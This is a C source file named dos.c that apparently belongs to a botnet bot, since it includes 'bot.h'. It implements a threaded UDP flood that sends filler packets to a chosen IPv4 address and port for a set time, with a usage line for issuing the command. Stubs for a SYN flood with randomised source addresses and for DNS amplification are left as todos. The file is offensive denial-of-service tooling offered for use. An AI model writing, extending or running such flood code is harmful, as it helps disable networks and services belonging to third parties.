/*
 *   Author           : 93aef0ce4dd141ece6f5
 *   Title            : dos.c
 *   Description      : denial of service functions
 *                      go here.
 *  
 *   Copyright (C) 2016  93aef0ce4dd141ece6f5
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

#define _WIN32_WINNT 0x501

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>

#elif defined(__linux__)

#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <pthread.h>
// need other headers?

#endif

#include "bot.h"

#define MAX_UDP_PAYLOAD 512

/*
 * generic udp flood
 * max packet data
 * and send out as many
 * packets as possible
 */
// usage: $udp -v [IPv4] -p [PORT] -h [THREADS] -t [TIME (s)]
// NOT SURE IF WORKING, REQUIRES TESTING
// NOT SURE IF WORKING, REQUIRES TESTING
// NOT SURE IF WORKING, REQUIRES TESTING
// NOT SURE IF WORKING, REQUIRES TESTING
// NOT SURE IF WORKING, REQUIRES TESTING
// NOT SURE IF WORKING, REQUIRES TESTING
// NOT SURE IF WORKING, REQUIRES TESTING
void *udp_flood (void *args) {
    printf ("Executing UDP\n");
    thr_args *ta = (thr_args *)args;

    int err;
    char payload[MAX_UDP_PAYLOAD];

    // set up connection data
    SOCKET target_s;
    struct addrinfo hints, *res;
    memset (&hints, 0, sizeof (hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

    WSADATA wsa;

    if (WSAStartup (MAKEWORD (2, 2), &wsa)) {
        return NULL;
    }

#endif

    int gai = getaddrinfo (ta->addr, ta->port, &hints, &res);
    if (gai) {
        return NULL;
    }
    
    target_s = socket (res->ai_family, res->ai_socktype, res->ai_protocol);
    if (target_s == -1) {
        return NULL;
    }

    // payload data
    memset (payload, 0x41, sizeof (payload)-1);
    payload[strlen (payload)] = '\0';
    int payload_len = strlen (payload);

    int start_time = time (NULL);
    while (time (NULL) - start_time < ta->time) {
        err = sendto (target_s, payload, payload_len, 0, 
                        res->ai_addr, res->ai_addrlen);
        if (err == -1) {
            return NULL;
        }
    }

    // clean up
    freeaddrinfo (res);

    shutdown (target_s, SD_BOTH);
    puts ("exiting flood thread");
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

    closesocket (target_s);
    ExitThread (0);

#elif defined(__linux__)

    close (target_s);
    pthread_exit (0);

#endif

    return NULL;
}
 
/*
 * syn flood
 * randomise source ip
 * randomise dest port?
 */
void *syn_flood (void *args) {
    // todo
    printf ("Executing SYN\n");
    //thr_args *ta = (thr_args *)args;

    puts ("exiting flood thread");
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

    //closesocket (target_s);
    ExitThread (0);

#elif defined(__linux__)

    //close (target_s);
    pthread_exit (0);

#endif

    return NULL;
}

/*
 * dns aplification
 * would be best if we
 * had an open dns resolver
 * to test the functionality
 * and to confirm if it works
 * dns header packets located
 * in the header file
 */
void *dns_amp (void *args) {
    // todo

    return NULL;
}